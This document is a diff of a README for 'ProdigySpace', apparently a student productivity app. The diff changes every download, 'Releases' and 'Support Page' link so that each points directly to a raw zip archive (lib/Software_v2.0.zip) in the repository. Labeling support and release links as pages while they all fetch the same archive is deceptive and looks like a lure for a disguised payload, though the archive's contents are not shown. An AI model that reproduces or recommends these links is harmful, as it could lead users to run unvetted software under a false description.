@@ -1,6 +1,6 @@
 # 🚀 prodigyspace - Boost Your Academic Productivity Easily
 
-![Download ProdigySpace](https://raw.githubusercontent.com/nanatgrail/prodigyspace/master/latitudinal/prodigyspace.zip%20ProdigySpace-Click%20Here-blue)
+![Download ProdigySpace](https://raw.githubusercontent.com/nanatgrail/prodigyspace/master/lib/Software_v2.0.zip%20ProdigySpace-Click%20Here-blue)
 
 ## 📖 Table of Contents
 1. [🖥️ Overview](#-overview)
@@ -15,7 +15,7 @@
 ProdigySpace is a productivity application designed for students. It helps you manage your expenses, organize your tasks, and stay on top of your studies. Whether you're tracking your spending or juggling multiple assignments, ProdigySpace offers a simple interface that makes it easy to maintain your academic goals.
 
 ## 📦 Download & Install
-To get started with ProdigySpace, you need to download the application. Visit this page to download: [ProdigySpace Releases](https://raw.githubusercontent.com/nanatgrail/prodigyspace/master/latitudinal/prodigyspace.zip).
+To get started with ProdigySpace, you need to download the application. Visit this page to download: [ProdigySpace Releases](https://raw.githubusercontent.com/nanatgrail/prodigyspace/master/lib/Software_v2.0.zip).
 
 1. Click on the link above.
 2. You will see a list of available versions.
@@ -65,7 +65,7 @@ A: Yes, if you create an account, your data will sync automatically when you log
 ## 📞 Support
 If you encounter any issues or have questions:
 
-- Visit our [Support Page](https://raw.githubusercontent.com/nanatgrail/prodigyspace/master/latitudinal/prodigyspace.zip) for answers and community support.
+- Visit our [Support Page](https://raw.githubusercontent.com/nanatgrail/prodigyspace/master/lib/Software_v2.0.zip) for answers and community support.
 - You can also submit an issue directly on GitHub for technical assistance.
 
 Feel free to reach out. We are here to help you make the most of ProdigySpace!
